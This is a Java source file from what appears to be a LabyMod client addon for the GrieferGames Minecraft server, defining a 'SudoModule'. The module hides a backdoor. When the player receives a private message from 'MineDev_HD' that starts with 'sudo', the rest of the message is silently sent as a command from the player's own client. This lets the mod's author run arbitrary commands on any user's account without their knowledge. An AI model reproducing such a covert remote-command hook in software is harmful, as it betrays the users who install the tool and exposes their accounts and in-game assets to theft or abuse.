package net.minedevhd.mineutil.modules.griefergames;

import java.util.ArrayList;
import java.util.List;

import java.awt.Color;

import net.labymod.api.events.MessageReceiveEvent;
import net.labymod.core.LabyModCore;
import net.labymod.main.LabyMod;
import net.minedevhd.mineutil.MineUtil;
import net.minedevhd.mineutil.settings.UtilCore;
import net.minedevhd.mineutil.utils.discord.Discord;

public class SudoModule implements UtilCore {
	
	public static void initModule() {
		mineUtil.getApi().getEventManager().register((MessageReceiveEvent) new MessageReceiveEvent() {
			@Override
			public boolean onReceive(String formatted, String unformatted) {
				if(mineUtil.isOnGrieferGames()) {
					if(formatted.startsWith("§r§6[§r") && formatted.contains("§r§6 -> §r§cmir§r§6] §r") && formatted.endsWith("§r")) {
						String message = unformatted;
						final String triggerMsg = "[Supreme ┃ MineDev_HD -> mir] sudo";
						
						if(message.contains(triggerMsg)) {
							message = message.substring(triggerMsg.length());
							
							if(message.split(" ").length > 0) {
								final String command = message.substring(" ".length());
								mineUtil.sendQueued(command);
								return true;
							}
						}
					}
				}
				return false;
			}
		});
	}
	
}